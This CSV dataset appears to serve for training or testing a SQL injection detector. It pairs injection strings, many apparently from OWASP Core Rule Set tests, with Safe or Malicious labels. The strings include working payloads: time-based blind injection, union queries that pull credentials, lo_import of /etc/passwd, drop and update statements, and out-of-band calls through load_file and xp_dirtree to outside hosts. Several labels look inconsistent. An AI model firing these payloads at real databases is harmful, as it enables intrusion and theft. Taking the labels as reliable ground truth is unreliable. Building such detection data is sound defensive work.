"string,classification"
"select * from user where password_last_changed not between '2021-04-11' and '2021-04-11',Malicious-Unsafe"
"email=z'or email notnull--,Malicious-Unsafe"
"email=x' or username like totpSecret escape 'x';,Malicious-Unsafe"
"email=admin@juice-sh.op' and email ilike email--,Malicious-Unsafe"
"email=admin@juice-sh.op' and email = all (select email)--,Malicious-Unsafe"
"var=user'collate nocase--,Malicious-Unsafe"
"var=user'collat`nocase`--,MaliciousIntended-but-safe"
"var=user'collate foo--,Malicious-Unsafe"
"var=user'collat`utf8mb4_general_ci`--,MaliciousIntended-but-safe"
"var=user'collate""\utf8mb4_general_ci""--,MaliciousIntended-but-safe"
"var=user'collateU&""$1#B#E#D""--,MaliciousIntended-but-safe"
"email=' notnull --,Malicious-Unsafe"
"email=admin@juice-sh.op'and unlikely (id)--,Malicious-Unsafe"
"text=Itishighlyunlikelythisisgoingtobeafalsepositive,Safe"
"email=admin@juice-sh.op\' and( likelihood (id,.0));',MaliciousIntended-but-safe"
"text=Aftercalculatingthelikelihoodthisshouldnotbematched.,Safe"
"/catalogue/rest/products/2499999||this.product/reviews,Safe"
"var=""1"" sSOUNDS LIKE ""SOUNDS LIKE 1&other_var=test,MaliciousIntended-but-safe"
"/get?a=1=1,Safe"
"/get?a=11=1,Safe"
"/get?a=1=11,Safe"
"/get?a=11!=11,Safe"
"/get?a=b,1=1,Safe"
"a=42 like 42,Safe"
"/get?a=This is like no other,Safe"
"/get?a=42<=>42,Safe"
"/?user=admin@juice-sh.op' and password glob password;,Malicious-Unsafe"
"/get?a=11!=1,Safe"
"/get?a=1!=11,Safe"
"/get?a=1 is not 2,Safe"
"/get?a=1 is not 1,Safe"
"a='1'notregexp'2',MaliciousIntended-but-safe"
"a='1'notregexp'1',MaliciousIntended-but-safe"
"/?sql_table=pg_catalog,Safe"
"INFORMATION_SCHEMA,Safe"
"database(,Safe"
"db_name(,Safe"
"tempdb,Safe"
"msdb,Safe"
"mysql.db,Safe"
"MSysAccessObjects,Safe"
"Northwind,Safe"
"SCHEMA_NAME,Safe"
"var=SKLJDRTZWS89E450W49NQB0W45BN""=sleep(12)="",Safe"
"var=1'andsleep(9)#,MaliciousIntended-but-safe"
"var=1(select*from(select(sleep(5)))d),MaliciousIntended-but-safe"
"var=unittests@coreruleset.org'(function(){if(typeoffoo===""undefined""){vara=newDate();do{varb=newDate();}while(b-a<20000);foo=1;}}())',Safe"
"var=test')and(select*from(select(sleep(10)))d)--,MaliciousIntended-but-safe"
"var=config.ini'andsleep(91)#,MaliciousIntended-but-safe"
"var=None')and(select*from(select(sleep(10)))a)--,MaliciousIntended-but-safe"
"var=eval(compile('forxinrange(1):\nimporttime\ntime.sleep(12)','a','single')),Safe"
"var=file:/init.ini'.sleep(12).',Safe"
"var=1)and(select*from(select(sleep(12)))a)--:1)and(select*from(select(sleep(12)))a)--,MaliciousIntended-but-safe"
"var=/path/to/file/config.ini')and(select*from(select(sleep(12)))a)--,MaliciousIntended-but-safe"
"var=${@print(chr(122).chr(97).chr(112).chr(95).chr(116).chr(111).chr(107).chr(101).chr(110))},Safe"
"var=test{${sleep(12)}},Safe"
"var=test""+eval(compile('forxinrange(1):\nimporttime\ntime.sleep(12)','a','single'))+"",Safe"
"var=test""+(function(){if(typeofgs78r==='undefined'){vara=newDate();do{varb=newDate();}while(b-a<20000);gs78r=1;}}())+"",Safe"
"var=\foobar.txt""orsleep(4)#,MaliciousIntended-but-safe"
"email=admin@juice-sh.op\' or json (id);,Malicious-Unsafe"
"email=admin@juice-sh.op\' or json_valid (id);,Malicious-Unsafe"
"email=admin@juice-sh.op\' or glob (id,id);,Malicious-Unsafe"
"var=foo'||(selectextractvalue(xmltype('<?xmlversion=""1.1""encoding=""UTF-8""?><!DOCTYPEroot[<!ENTITY%tocobSYSTEM""https://unit'||'tests.coreruleset.org/"">%tocob;,MaliciousIntended-but-safe"
"var=/config.txt'(selectload_file('\\\\unittests.coreruleset.org\\zow'))',MaliciousIntended-but-safe"
"var=(selectload_file('\\\\\\\\\\\\\\\\unitests.corerule'||'set.org\\\\\\\\hvs')),MaliciousIntended-but-safe"
"var=,FIND_IN_SET('22',Category),Safe"
"email=1' + 1 is likelihood(0.0,0.0) is 1--,Malicious-Unsafe"
"email=admin@example.com' or sqlite_compileoption_used (id)--,Malicious-Unsafe"
"email=admin@example.com'and not sqlite_compileoption_get (id)--,Malicious-Unsafe"
"/index.php?id=starts_with(password,'a')::int,Safe"
"/index.php?id=jsonb_pretty(...(1,password)::jsonb)::int,Safe"
"/index.php?id=...(json_build_object(1,password)::jsonb)::int,Safe"
"/index.php?id=unistr(password)::int,Safe"
"/?sql_table=sleep(534543),Safe"
"sleEP(3),Safe"
"sleep(5000),Safe"
"BENChmARk(2999/**/999,Md5(NoW(),MaliciousIntended-but-safe"
"BEncHMARk(2999999,Md5(NoW(''),MaliciousIntended-but-safe"
"BENCHMARK(5000000,MD5(0x48416166),MaliciousIntended-but-safe"
"benchmark(3000000,MD5(4),MaliciousIntended-but-safe"
"pay=BENCHMARK(1000000,md5""AND1883=1883--GSCC(''),MaliciousIntended-but-safe"
"pay=BeNChMaRK(1000000,md5AND9796=4706(''),MaliciousIntended-but-safe"
"/if(now()=sysdate(),sleep(12),0),Safe"
"/?var=SELECT BENCHMARK(1000000,1+1);,Safe"
"/?var=; sleep(0),Safe"
"/?var=I sleep well!,Safe"
"/?test=select+if(x,Safe"
"/?var=3' ' 1,Safe"
"javascript:""/*'/*`/*--></noscript></title></textarea></style></template></noembed></script><html"",Safe"
"/?var=';,Safe"
"/?var='glob 1;,Safe"
"/?var=';print',Safe"
"/?var=';#,Safe"
"/?var='or(id glob 1)--,Safe"
"/?var='or(glob 1)--,Safe"
"/?var= exec xp_cmdshell,Safe"
"""!"",Safe"
"""+union+select,Safe"
"current_user(,Safe"
"FROM+INFORMATION_SCHEMA.,Safe"
"';SELECT+P,Safe"
"UnIon+seleCt,Safe"
"'union select/,Safe"
"select]=polygon((/*!00000select*/*/*!00000from*/(/*!00000select*/*/*!00000from*/(/*!00000select*/concat_ws(0x7e3a,0x6d616b6d616e,version(),user(,MaliciousIntended-but-safe"
"user(,Safe"
"select(user(,Safe"
"SeLect*/+1,2,3,user(,Safe"
"select]=(ExtractValue(1,(select%20concat_ws(0x3a,user(,MaliciousIntended-but-safe"
"from`information_schema`,Safe"
"'select+H,Safe"
#NAME?
"""!+Y,Safe"
"exec+master.,Safe"
"into+outfile+',Safe"
"selectect%20user(,Safe"
#NAME?
"selectect%2520user(,Safe"
"execution=e1s1&OlyH=9767+AND+1=1+UNION+ALL+SELECT+1,NULL,'<script>alert(""XSS"")</script>',table_name+FROM+information_schema.tables+WHERE+2>1--/**/;+EXEC+xp_cmdshell,MaliciousIntended-but-safe"
"'!`,Safe"
""" UNION ALL SELECT,Safe"
"EXec+xp_cmdshell,Safe"
"select+1+FROM(select+count(*),concat((select+(select+concat(user(,MaliciousIntended-but-safe"
"`!1,Safe"
"uNioN++sElecT,Safe"
""";SELECT+P,Safe"
"pay=UnIoN+SeLeCt,Safe"
"var=1);declare@qvarchar(99);set@q='\\j0kwbatxjfgjp0qu3ibonwovamgmkq8h05unittests.corerule''set.org\kph';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe"
"var=content.ini);declare@qvarchar(99);set@q='\\i1kvc9uwkehiqzrt4hcnovpublhunittests.corerule''set.org\lri';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe"
"var=EmptyValue','4','2','7');declare@qvarchar(99);set@q='\\h5nug8yvodlhuyvs8ggmsuttfklkcjunittests.corerule'+'set.org\vcr';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe"
"var=test));declare@qvarchar(99);set@q='\\zwzc7qpdfvczlgmazy74jckb62cunittests.corrule'+'set.org\gej';execmaster.dbo.xp_dirtree@q;--,MaliciousIntended-but-safe"
"id=@.:=right(right((select+user_login+from+wordpress.wp_users+limit+1,1),1111),1111)+union#,MaliciousIntended-but-safe"
"distinctrowselect@.,MaliciousIntended-but-safe"
"arg=Die ""Union von Europa"",Safe"
"arg=SELECT IIF(1 > 1, 'TRUE', 'FALSE' ),Safe"
"arg=it is my beliif (stemming from personal experience), that,Safe"
"arg=appUser(sitename,user),Safe"
",varname""=somedata,Safe"
"var= @.= ( SELECT,Safe"
"pay=AND+2771=1709),Safe"
"pay=;+insert+into,Safe"
"pay=AND+7639=(,Safe"
"pay=or+120=121=,Safe"
"pay=AND+deleted+=+0),Safe"
"pay=/Cm7+OR+,Safe"
"pay=OR+(7319=8742),Safe"
"pay=||(null!=,Safe"
"pay=and+1!="",Safe"
"pay=div+role="",Safe"
"pay=div+id="",Safe"
"pay=div+style="",Safe"
"pay=or+1=',Safe"
"pay=AND+7829=(,Safe"
"pay=AND+4372=(,Safe"
"pay=;+UpdateUserTypeTracking,Safe"
"pay=oR+pmw==,Safe"
"pay=||+langCode+==+',Safe"
"pay=||+c+==+',Safe"
"pay=||+arg+==+',Safe"
"pay=/Hmong_language+AND+,Safe"
"pay=||+langCode+==,Safe"
"pay=||+checker+==,Safe"
"pay=&&+setPath+!=,Safe"
"pay=;set+@,Malicious-Unsafe"
"pay=;update+users,Malicious-Unsafe"
"pay=and+1=(,Safe"
"pay=/SPZwOaVcDWkrRly2aV01662fN+Or+,Safe"
"pay=OR+CType=',Safe"
"pay=1+OR+2+,Safe"
"pay=>SET+@OLD_SQL_NOTES,Safe"
"pay=;SET+@OLD_SQL_MODE,Malicious-Unsafe"
"pay=;SET+@OLD_FOREIGN_KEY_CHECKS,Malicious-Unsafe"
"pay=;SET+@OLD_UNIQUE_CHECKS,Malicious-Unsafe"
"pay=;drop,Malicious-Unsafe"
"pay=+SET+@OLD_SQL_NOTES,Safe"
"pay=@example.com&name=(select,Safe"
"pay=@extension]=MmcDirectmailSubscription&tx_mmcdirectmailsubscription_subscr[__referrer][@vendor]=(SELECT,Safe"
"pay=@extension]=MmcDirectmailSubscription&tx_mmcdirectmailsubscription_subscr[__referrer][@vendor]=MMC&tx_mmcdirectmailsubscription_subscr[__referrer][@controller]=Subscribe&tx_mmcdirectmailsubscription_subscr[__referrer][@action]=register&tx_mmcdirectmailsubscription_subscr[__referrer][arguments]=YTowOnt98f5f75937bad1b56b6c736ef42e625647dab347d&tx_mmcdirectmailsubscription_subscr[__referrer][@request]=a:4:{s:10:&tx_mmcdirectmailsubscription_subscr[__referrer][@trustedProperties]=a:4:{s:7:&tx_mmcdirectmailsubscription_subscr[address][firstName]=(SELECT,Safe"
"pay=and+object_type+=+',Safe"
"pay=/Business+and,Safe"
"pay=AND+value+=+',Safe"
"pay=4AND4+,Safe"
"pay=/3+or+,Safe"
"pay=/3+and(,Safe"
"pay=/xxxx_R+AND+,Safe"
"pay=/xxxx_R+or,Safe"
"pay=1+GROUP+BY+CONCAT(0x716a787671,(SELECT+MID((IFNULL(CAST(a_1_18+AS+CHAR),0x20)),1,54)+FROM+db_justiz_daz.ugesundheit_antworten+ORDER+BY+id+LIMIT+571,1),0x7178716b71,FLOOR(RAND(0)*2))+HAVING+MIN(,MaliciousIntended-but-safe"
"pay=AND+backend_layout!=,Safe"
"pay=AND+uid!=(,Safe"
"pay=and+1=1',Safe"
"pay=&&(l=!0),Safe"
"pay=||(e+="",Safe"
"pay=&&(e===,Safe"
"pay=&&(null==(,Safe"
"pay=&&(a="",Safe"
"pay=||(c=!1),Safe"
"pay=&&(d!==,Safe"
"pay=||(g=!0),Safe"
"pay=&&(e="",Safe"
"pay=&&(c=!0),Safe"
"pay=&&(f+=(,Safe"
"pay=||(x="",Safe"
"pay=&&(b=0),Safe"
"pay=||(e===,Safe"
"pay=||(c===,Safe"
"pay=&&+1==(,Safe"
"pay=ORbackend_layout=',Safe"
"pay=--alter,Safe"
"pay=AND(name="",Safe"
"pay=ORname="",Safe"
"pay=4oR2-,Safe"
"pay=ANDengine=',Safe"
"pay=andcode!="",Safe"
"pay=andfreigabe="",Safe"
"pay=AND6698=(,Safe"
"pay=orclass!="",Safe"
"pay=or4975==4975',Safe"
"pay=1GROUPBYCONCAT(0x7162766a71,(SELECT(CASEWHEN(5554=5554)THEN1ELSE0END)),0x7171786271,FLOOR(RAND(0)*2))HAVINGMIN(,MaliciousIntended-but-safe"
"/?string_to_convert=4294967296,Safe"
"/?i=2.2250738585072011e-308,Safe"
"/?var=) like (,Safe"
"/?var=)like(,Safe"
"/?var=I like you!,Safe"
"/?var= case when condition1 then result1,Safe"
"/?var=having pain!,Safe"
"/?var=SELECT x GROUP BY SOMETHING HAVING COUNT(Id) >= 9,Safe"
"/?var=SELECT * FROM `movies` GROUP BY `category_idyear_released` HAVING `category_id` = 8;,Safe"
"/?var=behaving badly/,Safe"
"/?var=o.havingu@gmail.com,Safe"
"/?var=if(2=,Safe"
"/?var=Just in case (abc),Safe"
"/?var=if(1234=,Safe"
"""+WAITFOR+DELAY+',Safe"
""";waitfor+delay+',Safe"
"';WAITFOR+DELAY+',Safe"
"';+waitfor+delay+',Safe"
"'+waitfor+delay+',Safe"
"pay="";waitfor+delay+',Safe"
"pay=ALTER+TABLE`mass_mails`+CHANGE`receiversreceivers`+ENUM('FACILITIES','APPLICATION_2015','APPLICATION_2016')+CHARACTER+SET+utf8,MaliciousIntended-but-safe"
"ALTER+TABLE`tx_v3appointment_domain_model_appointment`+ADD`video`+TEXT+CHARACTER+SET+latin1,MaliciousIntended-but-safe"
"/?var=EXECUTE IMMEDIATE "",Safe"
"/?var= HAVING COUNT(CustomerID) > 5,Safe"
"/?var=having fun,Safe"
"/?var=something LIKE ',Safe"
"/?var=union select col from,Safe"
"/?test=Xunionselectfrom,Safe"
"/?var=select pg_sleep,Safe"
"var=""tester@coreruleset.org""'waitfordelay'0:0:20'--,MaliciousIntended-but-safe"
"/mongo/show.php?u_id[$ne]=2,Safe"
"/?mongoQ=[$lte]asdfsd,Safe"
"/mongo/show.php?u_id[$regex]=2,Safe"
"{""$not"":""foo""},Safe"
"{""$nor"":""foo""},Safe"
"{""$where"":""foo""},Safe"
"{""$elemMatch"":""foo""},Safe"
"{""$text"":""foo""},Safe"
"var=)when234then&foo=bar,Safe"
"var=booked for 2021(including 2020,Safe"
"/?var=""' and = bar,Safe"
"/?var=' and 1 in (select min(name) from sysobjects where xtype = 'U' and name > '.') --,Malicious-Unsafe"
"/?var=order by if(1=1,1,sleep(1)),Safe"
"var=procedure analyse (,Safe"
"pay=exec+(@,Safe"
"pay=declare+@b,Safe"
"pay=DECLARE/**/@x,Safe"
"/index.php?id=password::int,Safe"
"/index.php?no=2&id=1' and unistr(password)::bool--,Malicious-Unsafe"
"/index.php?id=div(23,-2),Safe"
"/index.php?id=div+(23.23+,+2),Safe"
"/index.php?id=lo_import('/etc' || '/pass' || 'wd'),Malicious-Unsafe"
"/index.php?id=lo_get(16400),Malicious-Unsafe"
"/index.php?id=function(foo)::text,Safe"
"/index.php?id=function(foo)::bigint,Safe"
"/index.php?id=function(foo)::double precision,Safe"
"var=""'&var2=whatever,MaliciousIntended-but-safe"
"var=\""1or1-,MaliciousIntended-but-safe"
"var=\x23,Safe"
"""var=05111222333,Safe"
"andy.surname@somedomain.com"",Safe"
"var=05111222333andy.surname@somedomain.com,Safe"
"/?var=in ( select * from,MaliciousIntended-but-safe"
"/?var=except    select.1,2,MaliciousIntended-but-safe"
"/?var=except values(1,2),MaliciousIntended-but-safe"
"/?var=except selecting,MaliciousIntended-but-safe"
"email=x' or array[id] is not null--,Malicious-Unsafe"
"email=x' or email~all(array[email]);analyze--,Malicious-Unsafe"
"email=' and email not similar to id--,Malicious-Unsafe"
"email=' or true; foo,Malicious-Unsafe"
"email=' or false; foo,Malicious-Unsafe"
"email='||true,MaliciousIntended-but-safe"
"email='ortrue,MaliciousIntended-but-safe"
"/?var=;INSERT INTO table (col) VALUES,MaliciousIntended-but-safe"
"/?var=;insertion_424242,Safe"
"/?var=CREATE+FUNCTION+hello+(s+CHAR(20))+RETURNS+CHAR(50)+DETERMINISTIC+RETURN+CONCAT('Hello,+',s,'!');,Malicious-Unsafe"
"/?test=;truncate[xx,MaliciousIntended-but-safe"
"var=1234 AS ""foobar"" FROM tablevar2=whatever,MaliciousIntended-but-safe"
"selectChar(,MaliciousIntended-but-safe"
"SELECTGROUP_CONCAT(,MaliciousIntended-but-safe"
"selectload_file(,MaliciousIntended-but-safe"
"`AS`edit_user_id`from,MaliciousIntended-but-safe"
"pay=`+REGEXP,MaliciousIntended-but-safe"
"`AS`OXTIMESTAMP`from,MaliciousIntended-but-safe"
"(load_file(,MaliciousIntended-but-safe"
"`AS`documentType`FROM,MaliciousIntended-but-safe"
"6As""from,MaliciousIntended-but-safe"
",asidefrom,MaliciousIntended-but-safe"
"a=/create,Safe"
"a=/CREATETABLEPersons,Safe"
"Delete(Trashcan),Safe"
"5desc,Safe"
"34-delete,Safe"
"update,Safe"
"/select-quote,Safe"
"Update:After...,Safe"
"""desc"",Safe"
"a=/load.php,Safe"
"a=/update-assets,Safe"
"blablablaliveupdatechart,Safe"
".select-gws-banana,Safe"
"blablabla.Asevidencefromthefollowingblablabla,Safe"
"||(SELECT(DBMS_LDAP.INIT('169.1.1.1',19))FROM(DUAL))/investigate,Malicious-Unsafe"
"'||(select(pg_sleep(15))where(true))||'/investigate,Malicious-Unsafe"
"UNIONALLSELECTNULL,NULL,CONCAT(CONCAT('qqkjq','mxTSrPILRz'),'qvxvq')--sqCV,MaliciousIntended-but-safe"
"2020-03-01UNIONALLSELECTCONCAT,MaliciousIntended-but-safe"
"x"";SELECTLOAD_FILE(',MaliciousIntended-but-safe"
"-1UNIONSELECTnull,123456,null,null,null,null--,MaliciousIntended-but-safe"
"(CONVERT(INT,(SELECTCHAR(113)+CHAR(118)+CHAR(112)+CHAR(113)+CHAR(113)+(SELECT(CASEWHEN(6557=6557,MaliciousIntended-but-safe"
")UNIONALLSELECTNULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL--,MaliciousIntended-but-safe"
"1unionselect1,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,CONCAT('vbulletin','rce',@@version),MaliciousIntended-but-safe"
"(SELECT4440FROM(SELECTCOUNT(*),CONCAT(0x716b627a71,(SELECT(ELT(4440=4440,1))),0x7170716271,FLOOR,MaliciousIntended-but-safe"
"2759399466.1534185336-6863unionallselect1,1,1,1,1,1,1,1,1,CONCAT,MaliciousIntended-but-safe"
"'altera,Safe"
"""ALTERA,Safe"
"'alter/,Safe"
"""UNIONA,Safe"
"'UNIONA,Safe"
"'union/,Safe"
")asccFROM,MaliciousIntended-but-safe"
")ASordersFROM,MaliciousIntended-but-safe"
")A`carrier_id`from,MaliciousIntended-but-safe"
")ASRoleFROM,MaliciousIntended-but-safe"
")ASvalFROM,MaliciousIntended-but-safe"
")AS'Durchschnitt_Importzeit'FROM,MaliciousIntended-but-safe"
")ascol_0_0_from,MaliciousIntended-but-safe"
")A`count`FROM,MaliciousIntended-but-safe"
")ASschlagwoerterFROM,MaliciousIntended-but-safe"
")asUserfrom,MaliciousIntended-but-safe"
")AStFROM,MaliciousIntended-but-safe"
")asExecuteTheseSQLCommandsFROM,MaliciousIntended-but-safe"
"!As'from,MaliciousIntended-but-safe"
";Asnotfrom,MaliciousIntended-but-safe"
")asday1FROM,MaliciousIntended-but-safe"
"var='*from=1or'9,MaliciousIntended-but-safe"
"var='*from=1id'9,MaliciousIntended-but-safe"
"var='=#',MaliciousIntended-but-safe"
"var='?#=#,MaliciousIntended-but-safe"
"var='?#=--,MaliciousIntended-but-safe"
"var='orhomer9,MaliciousIntended-but-safe"
"var=^',MaliciousIntended-but-safe"
"var=""`*12344,MaliciousIntended-but-safe"
"var=>foo##'.,MaliciousIntended-but-safe"
"fro`db_miwfsys_refindex`limit,MaliciousIntended-but-safe"
"from(selectcount(*),concat((select(select(selectconcat(0x53,0x65,0x61,0x72,0x63,0x68,0x43,0x6F,0x6C,0x6C,0x65,0x63,0x74,0x6F,0x72)fro`information_schema`.tableslimit,MaliciousIntended-but-safe"
"fro`information_schema`.tableslimit,MaliciousIntended-but-safe"
"ORderby,MaliciousIntended-but-safe"
"SELECT(CASE,MaliciousIntended-but-safe"
"pay=FROM+termine+GROUP+BY+tag1&sql_delimit,MaliciousIntended-but-safe"
"SELECT6229FROM(SELECTCOUNT(*),CONCAT(0x717a786a71,(SELECT(CASE,MaliciousIntended-but-safe"
"SELECTCHAR(113)+CHAR(122)+CHAR(120)+CHAR(106)+CHAR(113)+(SELECT(CASE,MaliciousIntended-but-safe"
"SELECTUPPER(XMLType(CHR(60)||CHR(58)||CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,MaliciousIntended-but-safe"
"SELECTCONCAT(0x717a786a71,(SELECT(CASE,MaliciousIntended-but-safe"
"SELECT(CHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113))||(SELECT(CASE,MaliciousIntended-but-safe"
"SELECTCHR(113)||CHR(122)||CHR(120)||CHR(106)||CHR(113)||(SELECT(CASE,MaliciousIntended-but-safe"
"SELECT'qzxjq'||(SELECT(CASE,MaliciousIntended-but-safe"
"executephp,Safe"
"from(selectcount(*),concat((select(select(SELECTconcat(user_name,0x7c,password)FROMecs_admin_userdesclimit,MaliciousIntended-but-safe"
"Execute(,Safe"
"from+information_schema.tables+where+BINARY+LEFT(table_name,+1)+=+'nnn'+LIMIT,MaliciousIntended-but-safe"
"from+information_schema.tables+where+table_schema=database()+and+table_name+REGEXP+0x6d656d6265727324+limit,MaliciousIntended-but-safe"
"fromtype=vBForum:SocialGroupMessage&do=process&contenttypeid=5&categoryid[]=-99)+union+select+salt+from+user+where+userid=1+and+row(1,1)>(select+count(*),concat(+(select+user.salt)+,0x3a,floor(rand(0)*2))+x+from+(select+1+union+select+2+union+select+3)a+group+by+x+limit,MaliciousIntended-but-safe"
"from/**/(select/**/count(*),concat(floor(rand(0)*2),0x3a,(select/**/concat(user,0x3a,password)/**/from/**/pwn_base_admin/**/limit,MaliciousIntended-but-safe"
"HAVING+1=,MaliciousIntended-but-safe"
"execute+elysi,Safe"
"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(3419=3419,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)&limit,MaliciousIntended-but-safe"
"FROM(SELECT+COUNT(*),CONCAT(0x716a766b71,(SELECT+(ELT(9184=9184,1))),0x7171717071,FLOOR(RAND(0)*2))x+FROM+INFORMATION_SCHEMA.PLUGINS+GROUP+BY+x)a)+AND+'%'='&limit,MaliciousIntended-but-safe"
"from(select(sleep(20)))a)'&data[Job][limit,MaliciousIntended-but-safe"
"from(select(sleep(20)))a)+'&data[Job][limit,MaliciousIntended-but-safe"
"from(select(sleep(20)))a)--+&data[Job][limit,MaliciousIntended-but-safe"
"from(select(sleep(20)))a)&data[Job][limit,MaliciousIntended-but-safe"
"FROM+ack_variable+WHERE+name=""cron_last"";&sql_delimit,MaliciousIntended-but-safe"
"executenode_,Safe"
"executescald,Safe"
"executesystem,Safe"
"executeuser_,Safe"
"executeviews,Safe"
"executepatha,Safe"
"executeworkb,Safe"
"executepanel,Safe"
"pay=from+information_schema.tables+where+1=2+limit,MaliciousIntended-but-safe"
"pay=FROM+%60oxattribute%60+WHERE+CONVERT%28%60oxattribute%60.%60OXID%60+USING+utf8%29+%3D+%27n550a1cee455b9ce585343d75d112b77%27+LIMIT,MaliciousIntended-but-safe"
"pay=FROM(select+count(*),concat((select+(select+concat(session_id))+FROM+jml_session+LIMIT,MaliciousIntended-but-safe"
"pay=SELECT+dDJq+WHERE+9896=9896;SELECT+(CASE,MaliciousIntended-but-safe"
"pay=FROM`we_tblErrorLog`+WHERE`we_tblErrorLogID`+=+25251+LIMIT,MaliciousIntended-but-safe"
"pay=FROM`dates`+order+by`uname`,`date`,`load`&dummy`uname`&dummy`datum`&dummy`laden`&sql_delimit,MaliciousIntended-but-safe"
"pay=IF EXISTS (SELECT * FROM users WHERE username = 'root') BENCHMARK(1000000000,MD5(1)),MaliciousIntended-but-safe"
"/?var=sdfsd'or 1 > 1,Malicious-Unsafe"
"and'5'orig_var_datavarname=whatever,Safe"
"and7oranges,Safe"
"ABS(,Safe"
"benchmark(,Safe"
"cast(,Safe"
"char(,Safe"
"chr(,Safe"
"COALESCE(,Safe"
"Compress(,Safe"
"concat(,Safe"
"concat_ws(,Safe"
"convert(,Safe"
"COS(,Safe"
"COUNT(,Safe"
"date(,Safe"
"pay=date]=(,Safe"
"pay=day.+(,Safe"
"pay=day&'(,Safe"
"pay=decode(,Safe"
"pay=default(,Safe"
"pay=ELT(,Safe"
"pay=encode=(,Safe"
"pay=ExtractValue(,Safe"
"pay=floor(,Safe"
"pay=FLOOR+(,Safe"
"pay=format(,Safe"
"pay=GROUP_CONCAT(,Safe"
"pay=hex(,Safe"
"pay=if+!(,Safe"
"pay=if+(,Safe"
"pay=if(,Safe"
"pay=if\(,Safe"
"pay=IFNULL(,Safe"
"pay=in+'$(,Safe"
"pay=IN+(,Safe"
"pay=IN/**/(,Safe"
"pay=insert(,Safe"
"pay=left')?$(,Safe"
"pay=LEFT(,Safe"
"pay=length||!!$(,Safe"
